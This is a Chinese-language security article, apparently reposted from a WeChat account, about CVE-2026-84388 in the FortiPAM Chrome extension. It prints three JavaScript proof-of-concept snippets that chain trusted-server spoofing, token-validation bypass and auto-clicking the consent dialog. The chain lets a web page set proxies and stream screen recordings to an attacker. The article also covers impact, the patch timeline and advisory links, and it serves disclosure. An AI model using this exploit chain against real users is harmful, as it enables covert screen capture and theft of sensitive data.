---
title: Fortinet 特权访问代理漏洞：任意网站都能接管你的代理和屏幕
url: https://mp.weixin.qq.com/s/wyz2F_7Q8OrcUl_V8ObEsQ
source: Doonsec's feed
date: 2026-09-13
fetch_date: 2026-09-14T07:19:41.044875
---

# Fortinet 特权访问代理漏洞：任意网站都能接管你的代理和屏幕

# Fortinet 特权访问代理漏洞：任意网站都能接管你的代理和屏幕

幻泉之洲

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

> FortiPAM Chrome 扩展有超过一百万用户，但它的信任机制存在一个致命缺陷：任何网页都能把自己注册成“受信任服务器”，然后静默设置代理、打开新标签页并录制屏幕内容发回攻击者。CVSS 评分 9.1，漏洞编号 CVE-2026-84388。利用门槛低到只要诱导用户点开一个页面。

## 漏洞本身不复杂

Fortinet 的 PAM 扩展负责代理特权会话：打开目标系统、注入凭据、应用代理策略，必要时录屏审计。这些动作全部由从 FortiPAM 服务器拉取的配置驱动。问题就出在这里——任何页面都可以声称自己就是那台服务器。

## 三步完成利用

第一步，把自己变成受信任服务器。扩展里有一个 webRequest 监听器，监听 `https://*/api/v2/monitor/web-ui/state`，只要收到请求，就把请求的主机名无条件加进“受信任服务器”列表。它不检查请求是谁发起的，也不管请求是否成功。

fetch("https://" + location.hostname + "/api/v2/monitor/web-ui/state").catch(
  () => {},
);

攻击者在自己的页面里发一个 fetch 到自己的域名，域名就被标记为可信。就这么简单。

第二步，未授权启动。扩展的 `externally_connectable` 配置允许外部连接，而且一个非 JWT 的 access token 不会触发校验失败，而是直接跳过验证。攻击者控制域名后，扩展就会从攻击者那里拉取整个会话配置。

chrome.runtime.sendMessage(EXT\_ID, {
  action: "launcher",
  type: "extension",
  domain: location.origin, // 你的服务器
  accesstoken: "NOTAJWT", // 不是 JWT -> 不做校验
  sec\_id: 1,
  launcher: 1,
  secretName: "poc",
});

第三步，自动点掉确认弹窗。同意对话框渲染在主世界 DOM 里，任何网页都能替用户点击“允许”。

document
  .getElementById("fortinet-sv-modal-overlay")
  .shadowRoot.querySelector(".sv-btn-allow")
  .click();

到这一步，攻击者就能下发配置：设置代理、打开自己选定的标签页、把录屏流传回自己的服务器。

## 影响范围与真实风险

这个漏洞最直接的用途是窃取敏感数据。比如用户在攻击者打开的标签页里查看 API 密钥、内部系统信息，录屏直接就把内容送出去了。代理那部分反而没那么好利用——现在大部分网站走 HTTPS，不做降级攻击的话中间人很难插进去。

有没有真实案例？目前没有公开报道，我们也没发现实际利用的迹象。不过有其他研究人员独立发现了同一个问题，说明这不是什么隐蔽的边角料。

## 修复与时间线

7 月 17 日报告给 Fortinet，8 月 1 日补丁发布。响应速度算正常，但这个漏洞本来就不该存在。

Fortinet 官方公告：FG-IR-26-168[1]

CVE 记录：CVE-2026-84388[2]

## 几句实话

这个漏洞暴露出来的问题更实在。一个安全产品的浏览器扩展，信任边界居然画在“任何能发起 HTTPS 请求的页面”上，这相当于把钥匙挂在门外的锁上。检查发起者、校验 token、隔离同意对话框，这些都是基本操作，但组合起来就漏了个大洞。

对使用 FortiPAM 的企业来说，如果还停留在旧版本，升级是唯一选项。对安全研究者来说，这类扩展的信任模型值得多挖一挖——浏览器扩展的权限一旦和远程配置绑定，出事的概率远高于普通 Web 漏洞。

---

### 参考资料

[1] https://www.fortiguard.com/psirt/FG-IR-26-168

[2] https://www.cve.org/CVERecord?id=CVE-2026-84388

[3] https://amibeingpwned.com/blog/fortinet-pam-vuln

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/KK6rkaWbMNbNvNRWVlQ1KyqceSk3WZAqKUsEjFj2Mfib1H7RQOOarzKolWvdD1W3PGicFOEABZLLpNoL2u9RdAXg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过